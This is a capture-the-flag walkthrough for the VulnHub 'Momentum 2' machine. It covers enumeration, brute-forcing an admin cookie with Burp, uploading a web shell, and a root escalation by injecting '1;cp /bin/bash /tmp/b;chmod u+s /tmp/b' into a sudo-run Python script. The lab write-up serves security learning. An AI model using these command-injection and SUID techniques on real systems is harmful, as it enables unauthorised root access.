# Momemtum
# Link: https://www.vulnhub.com/entry/momentum-2,702/

## Enum

### Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Gobuster

```
/index.html           (Status: 200) [Size: 1428]
/img                  (Status: 301) [Size: 312] [--> http://192.168.1.145/img/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.145/css/]
/ajax.php             (Status: 200) [Size: 0]                                  
/manual               (Status: 301) [Size: 315] [--> http://192.168.1.145/manual/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.145/js/]    
/dashboard.html       (Status: 200) [Size: 513]                                   
/owls                 (Status: 301) [Size: 313] [--> http://192.168.1.145/owls/]  
/server-status        (Status: 403) [Size: 278] 
```

Intresting...

```
http://192.168.1.145/dashboard.html
```

We can upload files but only .txt seems to be accpeted. Checking out the code for main.js we can see the AJAX call (POST) to upload the file.  

![image](https://user-images.githubusercontent.com/5285547/123197771-efa11080-d4a3-11eb-82bd-0d876351ea2b.png)

Looking for the ajax.php we can also noticed there is a backup copy ajax.php.bak

```
http://192.168.1.145/ajax.php.bak
```

![image](https://user-images.githubusercontent.com/5285547/123197920-2bd47100-d4a4-11eb-8802-f6f354117b28.png)

Now we know we need to set the admin cookie (adding an extra charater as the hint suggests).  
We will use Burp for this. 

![image](https://user-images.githubusercontent.com/5285547/123198397-f3816280-d4a4-11eb-9cf5-b68d3d2627a9.png)

Next we need to work out that last char, so send the request to Burp's Intruder tab, Add a letter to the cookie and highlight it and click 

![image](https://user-images.githubusercontent.com/5285547/123198517-275c8800-d4a5-11eb-83e7-e81f76d24a91.png)

Using some python we can quickly list the alphabet. 

```
python3 -c 'import string;                                                                                 1 ⨯
for c in string.ascii_lowercase:          
        print(c)'
a
b
c
d
e
.
.
.
```

Add the list to burps paylaods section and fire away!  

![image](https://user-images.githubusercontent.com/5285547/123201606-e8313580-d4aa-11eb-9e76-26c390b7e328.png)

We get a result! Seems 'R' was the missing letter

![image](https://user-images.githubusercontent.com/5285547/123201561-d2237500-d4aa-11eb-9309-50c82a0d91fb.png)

Visiting the owls directory we can see our shell.php   
Time to get catch the reverseshell and get on the box

```
http://192.168.1.145/owls/
```

## User

Moving to /home/athena we can get our first flag and see a note for password-reminder.txt

password-reminder.txt
```
password : myvulnerableapp[Asterisk]
```

flag
```
4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
```

Using the password we can login as Athena and see if we can privesc to root

## Root

Athena
sudo -l

```
(root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
```

Running 
```
sudo python3 /home/team-tasks/cookie-gen.py
```

Gives us a new cookie value, checking the source code we can see some variable abuse in the CMD calling the subprocess.Popen

Code
```cookie = ''
for c in range(20):
    cookie += random.choice(chars)

print(cookie)

cmd = "echo %s >> log.txt" % seed
subprocess.Popen(cmd, shell=True)
```

We should be able to abuse this with command injection techniques. 
Sure enough a quick test gives us root. 

```
sudo python3 /home/team-tasks/cookie-gen.py 
~ Random Cookie Generation ~
[!] for security reasons we keep logs about cookie seeds.
Enter the seed : 1;bash -i
```

But its not stable, lets try again.. 

```
Enter the seed : 1;cp /bin/bash /tmp/b;chmod u+s /tmp/b
```
Now try the new bash shell :)

```
/tmp/b -p
```

Now we can access the last flag for the box. 

```
b-5.0# id
uid=1000(athena) gid=1000(athena) euid=0(root) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

And flag

```
4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
```
